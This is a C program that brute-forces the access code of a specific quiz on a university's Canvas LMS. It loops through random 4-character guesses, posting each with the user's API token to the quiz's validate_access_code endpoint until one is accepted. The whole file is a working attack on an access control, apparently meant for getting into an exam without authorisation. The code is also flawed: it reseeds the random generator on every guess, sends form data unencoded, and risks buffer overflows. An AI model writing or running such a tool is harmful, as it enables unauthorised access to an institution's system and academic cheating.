#include <stdio.h>
#include <curl/curl.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>

#define URL "https://canvas.ou.edu/api/v1/courses/315691/quizzes/518261/validate_access_code"
//#define URL "https://canvas.ou.edu/api/v1/courses/315691/quizzes/518259/validate_access_code"

struct MemoryStruct {
    char *memory;
    size_t size;
};

// Write callback function to handle received data
size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;

    mem->memory = realloc(mem->memory, mem->size + realsize + 1);
    if (mem->memory == NULL) {
        // out of memory
        printf("Not enough memory (realloc returned NULL)\n");
        return 0;
    }

    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;

    return realsize;
}


int guess(char code[], char canvas_key[]){
	
	CURL* curl;
	CURLcode res;

	//struct to store the result of the POST request
	struct MemoryStruct chunk;

    chunk.memory = malloc(1);  // Start with an empty memory buffer
    chunk.size = 0;

	int is_correct = 0;

	curl = curl_easy_init();
	if(curl){
		//set the url
		curl_easy_setopt(curl, CURLOPT_URL, URL);
		
		//set the post data
		char access_code[50] = "access_code=";
		strcat(access_code, code);
		printf("Code : %s\n", code);
		printf("Query String : %s\n", access_code);
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, access_code);
		
		//Create a list for custom headers
		struct curl_slist *headers = NULL;

		//add headers
		//headers = curl_slist_append(headers, "Content-Type: application/json");
		char auth[100] = "Authorization: Bearer ";
		strcat(auth, canvas_key);
		headers = curl_slist_append(headers, auth);

		//set the headers
		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
	
		// Set the write callback function
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);

        // Pass the struct to the callback function
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

		// perform the request
		res = curl_easy_perform(curl);
		
		//error checking
		if(res != CURLE_OK){
			fprintf(stderr, "curl_easy_perform(), failed: %s\n", curl_easy_strerror(res));
		}

		printf("Result: %s\n ", chunk.memory);
		int comp = strcmp(chunk.memory, "true");
		if(comp == 0){
			is_correct = 1;
		}
		
		//clean up
		free(chunk.memory);
		curl_slist_free_all(headers); //free custom headers list
		curl_easy_cleanup(curl);
	}

	printf("\n");
	
	return is_correct;
}

char* gen_guess(int length){
	char* code = malloc((length + 1) * sizeof(char));
	if(code == NULL){
		fprintf(stderr, "Memory allocation failed\n");
		exit(1);
	}

	const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$^&*()_-+={}[]|~`"; // Characters to choose from
    int charsetLength = sizeof(charset) - 1; // Length of the charset

    srand(time(NULL)); // Seed the random number generator

    for (int i = 0; i < length; i++) {
        code[i] = charset[rand() % charsetLength]; // Pick a random character from the charset
    }

	code[length] = '\0'; //add null terminator to end of string

	return code;
}

int main(int argc, char *argv[]){

	if(argc < 2){
		printf("Please provide canvas api key\n");
		return 1;
	}	
	
	char* canvas_key = argv[1];
	printf("%s\n", canvas_key);

	int correct = 0;
	while(correct == 0){
		int size = 4;
		char* code = gen_guess(size);
		int res = guess(code, canvas_key);
		if(res == 1){
			printf("Correct Code: %s\n", code);
			correct = 1;
		}
		free(code);
		//correct = 1; //Temporary
	}
	
	return 0;
}